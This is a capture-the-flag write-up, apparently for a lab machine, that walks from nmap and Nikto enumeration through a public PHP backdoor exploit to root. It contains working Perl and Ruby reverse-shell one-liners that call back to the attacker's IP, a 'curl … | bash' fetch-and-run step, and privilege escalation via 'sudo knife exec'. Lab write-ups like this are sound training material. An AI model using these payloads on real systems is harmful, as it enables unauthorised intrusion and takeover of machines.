# Enumeration
I began the same as always, with an nmap scan

```bash

Browsing to port `80`, there doesn't appear to be much on it. Running Nikto to see if anything interesting pops up

```bash
$ nikto -host http://10.10.10.242

That's something interesting, a dev version of PHP, doing a little google search reveals [exploit-db 49933](https://www.exploit-db.com/exploits/49933).

Running it instantly gives a stateless interactive shell!

```bash
$ python3 49933.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.

```

Crafting a simple perl reverse shell

```bash
$ cat rshell.pl
perl -e 'use Socket;$i="10.10.14.204";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

And piping that through bash

```bash
$ curl 10.10.14.204/rshell.pl | bash
```

Success! We now have an ok interactive shell!

# Privesc

After a big of looking around, it turns out that we can execute the `knife` programs as root. Exploring the help, there's a very interesting line

```
** EXEC COMMANDS **
knife exec [SCRIPT] (options)
```

We can execute commands commands? Well that seems nice. After playing with this a bit, it turns out that it's allows execution of Ruby scripts. So I crafted a little Ruby reverse shell as follows:

```bash
$ cat rshell.rb
exec("perl -e 'use Socket;$i=\"10.10.14.204\";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
```

Copied it over to the server and executed it with the `knife` program

```bash
$ wget 10.10.14.204/rshell.rb
$ sudo knife exec /tmp/rshell.rb
```

And catching that reverse shell gives us root!!
